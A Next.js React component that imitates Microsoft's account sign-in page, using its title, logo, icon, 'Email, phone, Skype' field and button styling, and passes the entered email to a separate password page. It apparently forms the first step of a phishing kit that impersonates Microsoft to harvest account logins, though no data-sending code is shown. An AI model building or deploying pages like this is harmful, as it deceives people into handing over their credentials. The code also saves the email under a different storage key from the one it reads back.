"use client";
import Head from "next/head";
import Image from "next/image";
import Link from "next/link";
import React, { useState, useEffect } from "react";
import { useRouter } from "next/router";
import Validation from "./Validation";

export default function Login() {
  let [value, Setvalue] = useState({
    email: "",
  });

  useEffect(() => {
    const savedEmail = localStorage.getItem("email");
    if (savedEmail) {
      Setvalue({ email: savedEmail });
    }
  }, []);

  let [errors, Seterrors] = useState({});
  const [isValid, setIsValid] = useState(false);
  const router = useRouter();

  const handleChange = (e) => {
    const newValue = { ...value, [e.target.name]: e.target.value };
    Setvalue(newValue);
    // Save email to local storage
    localStorage.setItem("MicrosoftEmail", newValue.email);
  };

  const handleClick = (e) => {
    e.preventDefault();
    const validationErrors = Validation(value);
    Seterrors(Validation(value));

    if (Object.keys(validationErrors).length === 0) {
      router.push("/Password");
    }
  };
  return (
    <>
      <Head>
        <title>Sign in to your account</title>
        <link rel="icon" href="/microsoft.ico" />
      </Head>
      <div className="relative bg-form-bg bg-cover bg-center h-screen">
        <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2">
          <div className="bg-white w-[300px] h-[350px] md:w-[400px] md:h-[350px] shadow-2xl px-6">
            <form action="#" className="flex flex-col py-8 px-4">
              <div>
                <Image src="/microsoft.png" alt="img" width={120} height={2} />
              </div>

              <div>
                <h3 className="text-xl font-semibold pt-2">Sign in</h3>
              </div>

              <div className="mt-3">
                {value.email === "" ? (
                  <p className="text-red-500 text-[14px]">{errors.value}</p>
                ) : (
                  <p className="text-red-500 text-[14px]">{errors.email}</p>
                )}
                <input
                  type="text"
                  name="email"
                  value={value.email}
                  placeholder="Email, phone, Skype"
                  className="w-[100%] border-none focus:outline-none text-[14px]"
                  onChange={handleChange}
                />
                <hr className="h-px my-2 bg-gray-600 border-0 dark:bg-gray-700"></hr>
              </div>

              <div className="flex gap-1 mt-3">
                <p className="text-[11px]">No account?</p>
                <Link className="text-[11px] text-blue-400">Create one!</Link>
              </div>

              <div className="mt-3">
                <Link href="/" className="text-[12px] text-blue-400">
                  Can't access your account?
                </Link>
              </div>

              <div className="flex justify-end mt-3">
                <button
                  onClick={handleClick}
                  className="bg-[#0067B8] hover:bg-[#022B57] text-white py-1 px-8"
                >
                  Next
                </button>
              </div>
            </form>
          </div>
        </div>
      </div>
    </>
  );
}
